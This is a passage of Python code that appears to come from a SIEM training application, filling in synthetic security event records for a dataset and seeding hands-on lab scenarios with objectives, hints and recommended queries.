                process_name=ed.get("process_name"),
                parent_process=ed.get("parent_process"),
                command_summary=ed.get("command_summary"),
                file_name=ed.get("file_name"),
                file_hash=ed.get("file_hash"),
                domain=ed.get("domain"),
                url=ed.get("url"),
                authentication_method=ed.get("authentication_method"),
                result=ed.get("result"),
                message=ed.get("message"),
                metadata_json=json.dumps({"synthetic": True}),
                raw_event_id=raw_ev.id,
                dataset_id=ds.id,
                source_id=ed.get("source_id"),
            )
            db.add(sec_ev)

        ds.event_count = seq
        ds.start_time = min_ts
        ds.end_time = max_ts
        db.commit()

    @classmethod
    def _seed_labs(cls, db: Session, dataset_id_map: dict[str, int]) -> None:
        """Seed SIEM hands-on lab scenarios."""
        for lab_def in cls.LAB_SCENARIOS:
            existing = db.execute(
                select(SIEMLabScenario).where(SIEMLabScenario.slug == lab_def["slug"])
            ).scalar_one_or_none()
            if not existing:
                ds_id = dataset_id_map.get(lab_def["dataset_stable_id"], 1)
                scenario = SIEMLabScenario(
                    slug=lab_def["slug"],
                    title=lab_def["title"],
                    description=lab_def["description"],
                    difficulty=lab_def["difficulty"],
                    dataset_id=ds_id,
                    objectives=lab_def["objectives"],
                    expected_event_count=lab_def.get("expected_event_count", 0),
                    hints=lab_def.get("hints"),
                    recommended_query=lab_def.get("recommended_query"),
                )
                db.add(scenario)
        db.commit()
